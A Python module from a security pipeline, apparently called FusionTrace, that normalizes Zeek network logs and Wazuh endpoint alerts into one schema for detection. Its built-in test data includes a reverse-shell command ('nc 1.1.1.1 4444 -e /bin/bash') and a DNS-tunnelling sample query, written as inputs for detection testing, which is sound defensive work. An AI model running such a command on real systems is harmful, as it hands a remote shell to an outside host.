"""
LogNormalizer 模块

本模块实现日志标准化与时间对齐逻辑，作为 ETL 的 Transform 阶段核心。功能包括：
- 将不同数据源（Zeek、Wazuh）映射到统一输出 schema；
- 时间对齐与校验（统一为 UTC）通过 `TimeAligner` 完成；
- 清洗源特有字段（例如 Zeek 的 "-" 占位符）；
- 生成全局事件 ID 以用于图数据库去重；
- 提供针对 Zeek（网络）与 Wazuh（端点）不同的解析分支。

主要类与方法：
- `TimeAligner`：时间校验与对齐工具，包含 `validate_timestamp` 和 `align`。
- `LogNormalizer.normalize(raw_message)`：主入口，返回统一字段的字典或 None。
- `_normalize_zeek` / `_normalize_wazuh`：分别处理 Zeek 与 Wazuh 的源数据清洗与字段映射。
- 其它辅助方法：字段清洗、事件 ID 生成和必填字段验证。
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, Optional, Set
import hashlib

# 初始化日志
logger = logging.getLogger("FusionTrace.Normalizer")


class TimeAligner:
    """
    时间对齐器 - 多源数据融合的核心基础设施
    
    职责:
    1. 统一时区转换（所有时间戳标准化为 UTC）
    2. 时间偏差校正（处理节点间的时钟偏移）
    3. 时间窗口计算（为后续的时空关联提供基础）
    """
    
    def __init__(self, max_skew_seconds: int = 300):
        """
        Args:
            max_skew_seconds: 允许的最大时钟偏差（秒），超过此值会告警
        """
        self.max_skew = timedelta(seconds=max_skew_seconds)
        self.reference_time = datetime.now(timezone.utc)
    
    def validate_timestamp(self, ts: datetime, source: str) -> bool:
        """
        验证时间戳合理性
        
        Returns:
            True if valid, False otherwise
        """
        if not ts:
            return False
        
        now = datetime.now(timezone.utc)
        
        # 检查1: 不能是未来时间（考虑最大偏差）
        if ts > now + self.max_skew:
            logger.warning(
                f"[{source}] 时间戳异常：未来时间 "
                f"(ts={ts.isoformat()}, now={now.isoformat()})"
            )
            return False
        
        # 检查2: 不能过于久远（超过30天视为异常）
        # if (now - ts).days > 30:
        #     logger.warning(f"[{source}] 时间戳过旧: {ts.isoformat()}")
        #     return False
        
        return True
    
    def align(self, ts: datetime) -> datetime:
        """
        时间对齐：确保时区为 UTC
        """
        if ts.tzinfo is None:
            # 假设无时区的时间戳为UTC
            return ts.replace(tzinfo=timezone.utc)
        return ts.astimezone(timezone.utc)


class LogNormalizer:
    """
    数据清洗与范式化引擎 (ETL - Transform)
    
    职责:
    1. 时间对齐 (Time Alignment) - 多源数据融合的基础
    2. 字段映射 (Field Mapping -> Standard Schema)
    3. 数据清洗 (Cleaning nulls/-)
    4. 数据验证 (确保下游 Parser 能正常处理)
    5. 生成全局唯一标识 (用于图数据库去重)
    
    统一输出 Schema（所有数据源使用相同字段名）:
    {
        # 基础字段
        "source": str,                    # 数据源标识（保留用于溯源）
        "event_category": str,            # 事件类别
        "event_type": str,                # 事件类型
        "timestamp": datetime,            # UTC标准化时间
        "event_id": str,                  # 全局唯一ID
        "timestamp_collected": str,       # 采集时间
        
        # 主机/代理信息（统一字段）
        "host_id": str,                   # 主机标识
        "host_name": str,                 # 主机名称
        "host_ip": str,                   # 主机IP
        
        # 网络信息（统一字段）
        "src_ip": str,                    # 源IP
        "src_port": int,                  # 源端口
        "dst_ip": str,                    # 目标IP
        "dst_port": int,                  # 目标端口
        "protocol": str,                  # 协议
        
        # 进程信息（统一字段）
        "process_id": int,                # 进程ID
        "parent_process_id": int,         # 父进程ID
        "process_name": str,              # 进程名称
        "process_path": str,              # 进程路径
        "working_directory": str,         # 工作目录
        "command_line": str,              # 命令行
        
        # 用户信息（统一字段）
        "user_id": int,                   # 用户ID
        "effective_user_id": int,         # 有效用户ID
        "user_name": str,                 # 用户名
        
        # 文件信息（统一字段）
        "file_path": str,                 # 文件路径
        "file_hash": str,                 # 文件哈希（优先SHA256）
        "file_size": int,                 # 文件大小
        "file_owner": str,                # 文件所有者
        "file_permissions": str,          # 文件权限
        
        # DNS信息（统一字段）
        "dns_query": str,                 # DNS查询
        "dns_answers": list,              # DNS应答
        "dns_query_type": str,            # 查询类型
        "dns_query_length": int,          # 查询长度
        
        # HTTP信息（统一字段）
        "http_method": str,               # HTTP方法
        "http_host": str,                 # HTTP主机
        "http_uri": str,                  # HTTP URI
        "http_user_agent": str,           # User Agent
        "http_status_code": int,          # 状态码
        
        # 连接信息（统一字段）
        "connection_state": str,          # 连接状态
        "duration": float,                # 持续时间
        "bytes_sent": int,                # 发送字节
        "bytes_received": int,            # 接收字节
        
        # 规则/检测信息（统一字段）
        "rule_id": str,                   # 规则ID
        "rule_level": int,                # 规则级别
        "rule_description": str,          # 规则描述
        "rule_tags": list,                # 规则标签
        
        # 原始事件标识（统一字段）
        "raw_event_id": str               # 原始事件ID
    }
    """

    # 必填字段定义（用于验证）
    REQUIRED_FIELDS: Set[str] = {"source", "event_category", "event_type", "timestamp"}

    def __init__(self):
        self.time_aligner = TimeAligner()
        self.processed_count = 0
        self.validation_errors = 0

    def normalize(self, raw_message: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        入口方法: 接收 collector 传来的 raw_message
        
        Args:
            raw_message: {
                "source": "zeek"/"wazuh",
                "sub_type": "conn"/"dns"/None,
                "timestamp_collected": ISO8601 string,
                "raw": {...}  # 原始日志数据
            }
        
        Returns:
            标准化的字典，如果无法处理则返回 None
        """
        try:
            source = raw_message.get("source")
            raw_data = raw_message.get("raw", {})

            if not source or not raw_data:
                logger.warning("缺少必要字段: source 或 raw")
                self.validation_errors += 1
                return None

            # 根据源类型分发处理
            normalized = None
            if source == "zeek":
                normalized = self._normalize_zeek(raw_data, raw_message.get("sub_type"))
            elif source == "wazuh":
                normalized = self._normalize_wazuh(raw_data)
            else:
                logger.warning(f"未知数据源: {source}")
                self.validation_errors += 1
                return None

            # 验证输出 Schema
            if normalized and self._validate_output(normalized):
                # 生成全局唯一 ID（用于 Neo4j 去重）
                normalized["event_id"] = self._generate_event_id(normalized)
                # 保留原始采集时间（用于延迟分析）
                normalized["timestamp_collected"] = raw_message.get("timestamp_collected")
                
                self.processed_count += 1
                if self.processed_count % 1000 == 0:
                    logger.info(f"[OK] 已处理 {self.processed_count} 条记录，验证失败: {self.validation_errors}")
                
                return normalized
            else:
                self.validation_errors += 1
                return None

        except Exception as e:
            logger.error(f"标准化处理异常: {str(e)}", exc_info=True)
            self.validation_errors += 1
            return None

    # ==========================================
    # Zeek 处理逻辑 (Network)
    # ==========================================
    def _normalize_zeek(self, data: Dict, sub_type: str) -> Optional[Dict]:
        """
        清洗 Zeek 日志 (conn, dns, http...)
        
        Args:
            data: Zeek 原始 JSON 数据
            sub_type: 日志类型 (conn/dns/http等)
        """
        # 1. 解析并验证时间戳
        timestamp = self._parse_zeek_timestamp(data.get("ts"))
        if not self.time_aligner.validate_timestamp(timestamp, "zeek"):
            return None
        
        # 2. 基础字段初始化（使用统一字段名）
        normalized = {
            "source": "zeek",
            "event_category": "network",
            "event_type": sub_type or "unknown",
            "timestamp": self.time_aligner.align(timestamp),
            "raw_event_id": data.get("uid"),  # Zeek的连接唯一ID（统一字段名）
            
            # 主机信息（Zeek从网络包中无法获取主机名，设为None）
            "host_id": None,
            "host_name": None,
            "host_ip": None,
            
            # 进程信息（Zeek网络层无进程信息）
            "process_id": None,
            "parent_process_id": None,
            "process_name": None,
            "process_path": None,
            "working_directory": None,
            "command_line": None,
            
            # 用户信息（Zeek网络层无用户信息）
            "user_id": None,
            "effective_user_id": None,
            "user_name": None,
            
            # 文件信息（Zeek网络层无文件信息）
            "file_path": None,
            "file_hash": None,
            "file_size": None,
            "file_owner": None,
            "file_permissions": None,
            
            # 规则信息（Zeek是被动监听，无规则）
            "rule_id": None,
            "rule_level": None,
            "rule_description": None,
            "rule_tags": None,
        }

        # 3. 网络五元组映射（统一字段名）
        # Zeek JSON 里的 key 可能是 "id.orig_h" (扁平) 或 "id": {"orig_h":...} (嵌套)
        normalized["src_ip"] = self._get_zeek_field(data, "id.orig_h")
        normalized["src_port"] = self._get_zeek_field(data, "id.orig_p")
        normalized["dst_ip"] = self._get_zeek_field(data, "id.resp_h")
        normalized["dst_port"] = self._get_zeek_field(data, "id.resp_p")
        normalized["protocol"] = self._clean_value(data.get("proto", "unknown")).lower()  # 统一字段名

        # 4. 清洗所有字段（处理 Zeek 特有的 "-" 空值）
        normalized = self._clean_zeek_nulls(normalized)

        # 5. 初始化其他统一字段为None
        normalized.update({
            "dns_query": None,
            "dns_answers": None,
            "dns_query_type": None,
            "dns_query_length": None,
            "http_method": None,
            "http_host": None,
            "http_uri": None,
            "http_user_agent": None,
            "http_status_code": None,
            "connection_state": None,
            "duration": None,
            "bytes_sent": None,
            "bytes_received": None,
        })

        # 6. 子类型特定字段填充（使用统一字段名）
        if sub_type == "dns":
            normalized["dns_query"] = self._clean_value(data.get("query"))
            normalized["dns_answers"] = data.get("answers")  # list usually
            normalized["dns_query_type"] = self._clean_value(data.get("qtype_name"))  # 统一字段名
            # DNS 可能被用于隧道传输，记录query长度用于异常检测
            if normalized["dns_query"]:
                normalized["dns_query_length"] = len(normalized["dns_query"])

        elif sub_type == "http":
            normalized["http_method"] = self._clean_value(data.get("method"))
            normalized["http_host"] = self._clean_value(data.get("host"))
            normalized["http_uri"] = self._clean_value(data.get("uri"))
            normalized["http_user_agent"] = self._clean_value(data.get("user_agent"))
            normalized["http_status_code"] = data.get("status_code")

        elif sub_type == "conn":
            # 连接日志额外字段（使用统一字段名）
            normalized["connection_state"] = self._clean_value(data.get("conn_state"))
            normalized["duration"] = data.get("duration")
            normalized["bytes_sent"] = data.get("orig_bytes")
            normalized["bytes_received"] = data.get("resp_bytes")  # 统一字段名

        elif sub_type == "files":
            # 文件传输日志（使用统一字段名）
            normalized["event_category"] = "file"  # 修改事件类别为文件
            normalized["raw_event_id"] = data.get("fuid")  # 文件唯一标识符
            normalized["file_path"] = self._clean_value(data.get("filename"))
            # 文件哈希（优先SHA256）
            normalized["file_hash"] = (
                self._clean_value(data.get("sha256")) or 
                self._clean_value(data.get("sha1")) or 
                self._clean_value(data.get("md5"))
            )
            normalized["file_size"] = data.get("total_bytes") or data.get("seen_bytes")
            normalized["duration"] = data.get("duration")
            # 字节统计
            normalized["bytes_sent"] = data.get("seen_bytes") if data.get("is_orig") else 0
            normalized["bytes_received"] = data.get("seen_bytes") if not data.get("is_orig") else data.get("total_bytes")

        return normalized

    # ==========================================
    # Wazuh 处理逻辑 (Endpoint)
    # ==========================================
    def _normalize_wazuh(self, data: Dict) -> Optional[Dict]:
        """
        清洗 Wazuh Alert (支持 Linux Auditd、Windows Sysmon、文件监控)
        
        Args:
            data: Wazuh 原始 Alert JSON
        """
        # 1. 解析并验证时间戳
        timestamp = self._parse_wazuh_timestamp(data.get("timestamp"))
        if not self.time_aligner.validate_timestamp(timestamp, "wazuh"):
            return None
        
        # 2. 基础规则过滤（可配置阈值）
        # 注意：真实 Wazuh 数据中，Linux Auditd 日志的级别通常是 3
        # 降低阈值以支持真实数据处理
        rule_level = data.get("rule", {}).get("level", 0)
        if rule_level < 1:  # 只过滤 level 0（信息性日志）
            logger.debug(f"过滤低级别告警: Level {rule_level}")
            return None

        rule_groups = data.get("rule", {}).get("groups", [])
        agent_info = data.get("agent", {})
        
        # 判断数据源类型（Linux Auditd / Windows Sysmon / Syscheck）
        data_source = data.get("data", {})
        win_data = data_source.get("win", {})
        audit_data = data_source.get("audit", {})
        syscheck_data = data.get("syscheck", {})

        # 3. 基础字段初始化（使用统一字段名）
        normalized = self._init_unified_schema()
        normalized.update({
            "source": "wazuh",
            "event_category": "endpoint",
            "event_type": "unknown",
            "timestamp": self.time_aligner.align(timestamp),
            
            # 主机信息（统一字段名）
            "host_id": agent_info.get("id"),
            "host_name": agent_info.get("name"),
            "host_ip": agent_info.get("ip"),
            
            # 规则信息（统一字段名）
            "rule_id": data.get("rule", {}).get("id"),
            "rule_level": rule_level,
            "rule_description": data.get("rule", {}).get("description"),
            "rule_tags": rule_groups,  # 用于后续 MITRE 映射
        })

        # 4. 根据数据源类型分发处理
        if win_data:
            # Windows Sysmon 日志
            self._extract_windows_sysmon(normalized, win_data)
        elif audit_data:
            # Linux Auditd 日志
            self._extract_linux_auditd(normalized, audit_data)
        elif syscheck_data or "syscheck" in rule_groups:
            # 文件完整性监控
            self._extract_syscheck(normalized, syscheck_data)

        return normalized

    def _extract_windows_sysmon(self, normalized: Dict, win_data: Dict):
        """
        提取 Windows Sysmon 数据（使用统一字段名）
        
        支持的事件类型：
        - Event ID 1: Process Creation（进程创建）
        - Event ID 3: Network Connection（网络连接）
        - Event ID 11: File Creation（文件创建）
        - 其他事件根据需要扩展
        """
        eventdata = win_data.get("eventdata", {})
        system = win_data.get("system", {})
        event_id = system.get("eventID")
        
        # 提取主机名（如果agent信息中没有）
        if not normalized["host_name"]:
            normalized["host_name"] = system.get("computer")
        
        # Event ID 1: Process Creation
        if event_id == "1":
            normalized["event_category"] = "process"
            normalized["event_type"] = "process_create"
            normalized["raw_event_id"] = eventdata.get("processGuid")
            
            # 进程信息
            normalized["process_id"] = self._safe_int(eventdata.get("processId"))
            normalized["parent_process_id"] = self._safe_int(eventdata.get("parentProcessId"))
            normalized["process_name"] = self._extract_filename(eventdata.get("image"))
            normalized["process_path"] = eventdata.get("image")
            normalized["working_directory"] = eventdata.get("currentDirectory")
            normalized["command_line"] = eventdata.get("commandLine")
            
            # 用户信息
            normalized["user_name"] = eventdata.get("user")
            normalized["user_id"] = eventdata.get("logonId")  # Windows LogonId
            
            # 文件哈希（从Sysmon的hashes字段提取）
            normalized["file_hash"] = self._extract_sysmon_hash(eventdata.get("hashes"))
            normalized["file_path"] = eventdata.get("image")
        
        # Event ID 3: Network Connection
        elif event_id == "3":
            normalized["event_category"] = "network"
            normalized["event_type"] = "network_connect"
            normalized["raw_event_id"] = eventdata.get("processGuid")
            
            # 网络信息
            normalized["src_ip"] = eventdata.get("sourceIp")
            normalized["src_port"] = self._safe_int(eventdata.get("sourcePort"))
            normalized["dst_ip"] = eventdata.get("destinationIp")
            normalized["dst_port"] = self._safe_int(eventdata.get("destinationPort"))
            normalized["protocol"] = (eventdata.get("protocol") or "").lower()
            
            # 关联进程信息
            normalized["process_id"] = self._safe_int(eventdata.get("processId"))
            normalized["process_path"] = eventdata.get("image")
            normalized["process_name"] = self._extract_filename(eventdata.get("image"))
            normalized["user_name"] = eventdata.get("user")
        
        # Event ID 11: File Creation
        elif event_id == "11":
            normalized["event_category"] = "file"
            normalized["event_type"] = "file_create"
            normalized["raw_event_id"] = eventdata.get("processGuid")
            
            # 文件信息
            normalized["file_path"] = eventdata.get("targetFilename")
            
            # 关联进程信息
            normalized["process_id"] = self._safe_int(eventdata.get("processId"))
            normalized["process_path"] = eventdata.get("image")
            normalized["process_name"] = self._extract_filename(eventdata.get("image"))
            normalized["user_name"] = eventdata.get("user")

    def _extract_linux_auditd(self, normalized: Dict, audit_data: Dict):
        """
        提取 Linux Auditd 数据 (Syscalls - 进程行为)（使用统一字段名）
        """
        normalized["event_category"] = "process"
        normalized["event_type"] = audit_data.get("type", "execve")

        # 进程相关（PID/PPID用于构建进程树）
        normalized["process_id"] = self._safe_int(audit_data.get("pid"))
        normalized["parent_process_id"] = self._safe_int(audit_data.get("ppid"))
        normalized["process_name"] = audit_data.get("command") or audit_data.get("exe")
        normalized["process_path"] = audit_data.get("exe")
        normalized["working_directory"] = audit_data.get("cwd")

        # 用户上下文（用于权限提升检测）
        normalized["user_id"] = self._safe_int(audit_data.get("uid"))
        normalized["effective_user_id"] = self._safe_int(audit_data.get("euid"))
        normalized["user_name"] = audit_data.get("auid_user") or audit_data.get("uid_user")

        # 命令行参数（用于检测命令注入、反弹Shell等）
        # 支持两种格式：
        # 1. 模拟数据格式: execve_args: ["bash", "-c", "..."]
        # 2. 真实Wazuh格式: execve: {"a0": "/bin/sh", "a1": "-c", "a2": "..."}
        cmdline_raw = audit_data.get("execve_args")
        
        if cmdline_raw is None:
            # 尝试从嵌套的 execve 对象中提取参数（真实 Wazuh 数据格式）
            execve_obj = audit_data.get("execve", {})
            if execve_obj:
                # 提取 a0, a1, a2... 参数并按顺序组合
                args = []
                i = 0
                while f"a{i}" in execve_obj:
                    args.append(str(execve_obj[f"a{i}"]))
                    i += 1
                cmdline_raw = args if args else audit_data.get("a0")
        
        if isinstance(cmdline_raw, list):
            normalized["command_line"] = " ".join(str(x) for x in cmdline_raw)
        else:
            normalized["command_line"] = str(cmdline_raw) if cmdline_raw else None

    def _extract_syscheck(self, normalized: Dict, syscheck_data: Dict):
        """
        提取 Syscheck (文件完整性监控 FIM)（使用统一字段名）
        """
        normalized["event_category"] = "file"
        normalized["event_type"] = syscheck_data.get("event", "modification")
        normalized["file_path"] = syscheck_data.get("path")
        normalized["file_hash"] = syscheck_data.get("sha256_after") or syscheck_data.get("md5_after")
        normalized["file_size"] = syscheck_data.get("size_after")
        normalized["file_owner"] = syscheck_data.get("uname_after")
        normalized["file_permissions"] = syscheck_data.get("perm_after")

    def _extract_filename(self, path: str) -> Optional[str]:
        """
        从完整路径中提取文件名
        """
        if not path:
            return None
        # 支持 Windows 和 Linux 路径
        return path.split("\\")[-1] if "\\" in path else path.split("/")[-1]

    def _extract_sysmon_hash(self, hashes: str) -> Optional[str]:
        """
        从 Sysmon 的 hashes 字段提取哈希值（优先SHA256）
        
        格式: "SHA1=xxx,MD5=xxx,SHA256=xxx,IMPHASH=xxx"
        """
        if not hashes:
            return None
        
        hash_dict = {}
        for item in hashes.split(","):
            if "=" in item:
                key, value = item.split("=", 1)
                hash_dict[key.strip().upper()] = value.strip()
        
        # 优先返回 SHA256
        return hash_dict.get("SHA256") or hash_dict.get("SHA1") or hash_dict.get("MD5")

    # ==========================================
    # 辅助函数
    # ==========================================

    def _init_unified_schema(self) -> Dict:
        """
        初始化统一的输出Schema（所有字段默认为None）
        """
        return {
            # 基础字段（后续填充）
            "source": None,
            "event_category": None,
            "event_type": None,
            "timestamp": None,
            "event_id": None,
            "timestamp_collected": None,
            "raw_event_id": None,
            
            # 主机信息
            "host_id": None,
            "host_name": None,
            "host_ip": None,
            
            # 网络信息
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "protocol": None,
            
            # 进程信息
            "process_id": None,
            "parent_process_id": None,
            "process_name": None,
            "process_path": None,
            "working_directory": None,
            "command_line": None,
            
            # 用户信息
            "user_id": None,
            "effective_user_id": None,
            "user_name": None,
            
            # 文件信息
            "file_path": None,
            "file_hash": None,
            "file_size": None,
            "file_owner": None,
            "file_permissions": None,
            
            # DNS信息
            "dns_query": None,
            "dns_answers": None,
            "dns_query_type": None,
            "dns_query_length": None,
            
            # HTTP信息
            "http_method": None,
            "http_host": None,
            "http_uri": None,
            "http_user_agent": None,
            "http_status_code": None,
            
            # 连接信息
            "connection_state": None,
            "duration": None,
            "bytes_sent": None,
            "bytes_received": None,
            
            # 规则信息
            "rule_id": None,
            "rule_level": None,
            "rule_description": None,
            "rule_tags": None,
        }

    def _validate_output(self, normalized: Dict) -> bool:
        """
        验证标准化输出是否符合 Schema 要求
        """
        # 检查必填字段
        for field in self.REQUIRED_FIELDS:
            if field not in normalized or normalized[field] is None:
                logger.warning(f"输出验证失败: 缺少必填字段 '{field}'")
                return False
        
        # 检查时间戳类型
        if not isinstance(normalized.get("timestamp"), datetime):
            logger.warning("输出验证失败: timestamp 不是 datetime 类型")
            return False
        
        return True

    def _generate_event_id(self, normalized: Dict) -> str:
        """
        生成全局唯一事件ID（用于Neo4j约束和去重）
        
        策略:
        - Zeek: 使用原生 uid
        - Wazuh: 使用 host_id + timestamp + rule_id 组合
        """
        source = normalized.get("source")
        
        if source == "zeek" and normalized.get("raw_event_id"):
            # Zeek 的 uid 本身就是唯一的（使用统一字段名）
            return f"zeek_{normalized['raw_event_id']}"
        
        # Wazuh 或其他：生成组合ID（使用统一字段名）
        components = [
            source,
            normalized.get("host_id", ""),
            normalized["timestamp"].isoformat(),
            str(normalized.get("rule_id", "")),
            str(normalized.get("process_id", ""))
        ]
        unique_str = "_".join(str(c) for c in components)
        return hashlib.md5(unique_str.encode()).hexdigest()

    def _clean_value(self, value: Any) -> Optional[Any]:
        """
        清洗单个值（处理 Zeek 的 "-" 和其他空值）
        """
        if value == "-" or value == "" or value == "null":
            return None
        return value

    def _clean_zeek_nulls(self, data: Dict) -> Dict:
        """
        批量清洗 Zeek 数据中的 "-" 空值
        """
        return {k: self._clean_value(v) for k, v in data.items()}

    def _safe_int(self, value: Any) -> Optional[int]:
        """
        安全转换为整数
        """
        try:
            return int(value) if value is not None else None
        except (ValueError, TypeError):
            return None

    def _get_zeek_field(self, data: Dict, dot_key: str):
        """
        兼容 Zeek 的扁平键(id.orig_h)和嵌套键(id -> orig_h)
        """
        if dot_key in data:
            return data[dot_key]

        # 尝试拆解 id.orig_h -> data['id']['orig_h']
        parts = dot_key.split('.')
        current = data
        for part in parts:
            if isinstance(current, dict) and part in current:
                current = current[part]
            else:
                return None
        return current

    def _parse_zeek_timestamp(self, ts) -> datetime:
        """
        处理 Zeek 时间戳 (支持 Float Epoch 或 ISO 字符串)
        
        Zeek 默认使用 Unix Epoch (Float)，但可配置为 ISO8601
        """
        try:
            if isinstance(ts, (float, int)):
                # Unix Epoch 时间戳
                return datetime.fromtimestamp(ts, timezone.utc)
            elif isinstance(ts, str):
                # ISO8601 格式: "2023-10-27T10:00:00.000Z"
                ts_normalized = ts.replace('Z', '+00:00')
                return datetime.fromisoformat(ts_normalized)
        except (ValueError, OSError) as e:
            logger.warning(f"Zeek 时间戳解析失败: {ts}, 错误: {e}")
        
        # 降级方案：使用当前时间
        return datetime.now(timezone.utc)

    def _parse_wazuh_timestamp(self, ts_str: str) -> datetime:
        """
        处理 Wazuh 时间戳 (ISO 8601)
        
        常见格式:
        - 2023-10-27T10:00:00.123+0000
        - 2023-10-27T10:00:00Z
        """
        try:
            if ts_str:
                # 统一处理时区格式
                ts_normalized = (
                    ts_str
                    .replace('Z', '+00:00')
                    .replace('+0000', '+00:00')
                )
                return datetime.fromisoformat(ts_normalized)
        except (ValueError, AttributeError) as e:
            logger.warning(f"Wazuh 时间戳解析失败: {ts_str}, 错误: {e}")
        
        # 降级方案：使用当前时间
        return datetime.now(timezone.utc)


# ==========================================
# 测试与验证
# ==========================================
if __name__ == "__main__":
    import json
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    norm = LogNormalizer()

    print("=" * 70)
    print("FusionTrace ETL Normalizer - 单元测试")
    print("=" * 70)

    # 测试 1: Wazuh Auditd (进程执行)
    print("\n[测试 1] Wazuh Auditd - 反弹Shell检测")
    test_time = datetime.now(timezone.utc).isoformat()
    wazuh_sample = {
        "source": "wazuh",
        "timestamp_collected": test_time,
        "raw": {
            "timestamp": test_time,
            "agent": {
                "id": "001",
                "name": "victim-01",
                "ip": "192.168.1.100"
            },
            "rule": {
                "id": "100002",
                "level": 12,
                "description": "Suspicious reverse shell command detected",
                "groups": ["audit", "attack"]
            },
            "data": {
                "audit": {
                    "type": "execve",
                    "command": "nc",
                    "pid": "1234",
                    "ppid": "1111",
                    "exe": "/usr/bin/nc",
                    "uid": "1000",
                    "euid": "0",
                    "execve_args": ["nc", "1.1.1.1", "4444", "-e", "/bin/bash"]
                }
            }
        }
    }
    result = norm.normalize(wazuh_sample)
    print(json.dumps(result, indent=2, default=str))

    # 测试 2: Zeek DNS (DNS隧道检测)
    print("\n[测试 2] Zeek DNS - 潜在DNS隧道")
    zeek_dns_sample = {
        "source": "zeek",
        "sub_type": "dns",
        "timestamp_collected": datetime.now(timezone.utc).isoformat(),
        "raw": {
            "ts": datetime.now(timezone.utc).timestamp(),
            "uid": "CZvHT84NqF9NqWdCj",
            "id.orig_h": "192.168.1.100",
            "id.orig_p": 54321,
            "id.resp_h": "8.8.8.8",
            "id.resp_p": 53,
            "proto": "udp",
            "query": "dGVzdGRhdGF0ZXN0ZGF0YXRlc3RkYXRh.malicious.com",
            "qtype_name": "A",
            "answers": ["1.2.3.4"]
        }
    }
    result = norm.normalize(zeek_dns_sample)
    print(json.dumps(result, indent=2, default=str))

    # 测试 3: Zeek Conn (网络连接)
    print("\n[测试 3] Zeek Conn - C2通信检测")
    zeek_conn_sample = {
        "source": "zeek",
        "sub_type": "conn",
        "timestamp_collected": datetime.now(timezone.utc).isoformat(),
        "raw": {
            "ts": datetime.now(timezone.utc).timestamp(),
            "uid": "CAY3n33VVLqSbiPdV7",
            "id.orig_h": "192.168.1.100",
            "id.orig_p": 49152,
            "id.resp_h": "1.1.1.1",
            "id.resp_p": 443,
            "proto": "tcp",
            "conn_state": "SF",
            "duration": 120.5,
            "orig_bytes": 1024,
            "resp_bytes": 2048
        }
    }
    result = norm.normalize(zeek_conn_sample)
    print(json.dumps(result, indent=2, default=str))

    # 测试 4: Wazuh Syscheck (文件监控)
    print("\n[测试 4] Wazuh Syscheck - 文件完整性监控")
    wazuh_fim_sample = {
        "source": "wazuh",
        "timestamp_collected": datetime.now(timezone.utc).isoformat(),
        "raw": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "agent": {"id": "001", "name": "victim-01"},
            "rule": {
                "id": "550",
                "level": 7,
                "description": "File modified",
                "groups": ["syscheck", "file_integrity"]
            },
            "syscheck": {
                "path": "/etc/passwd",
                "event": "modified",
                "sha256_after": "abc123...",
                "md5_after": "def456...",
                "size_after": 2048,
                "uname_after": "root",
                "perm_after": "rw-r--r--"
            }
        }
    }
    result = norm.normalize(wazuh_fim_sample)
    print(json.dumps(result, indent=2, default=str))

    print("\n" + "=" * 70)
    print(f"[OK] 测试完成 - 处理总数: {norm.processed_count}, 验证失败: {norm.validation_errors}")
    print("=" * 70)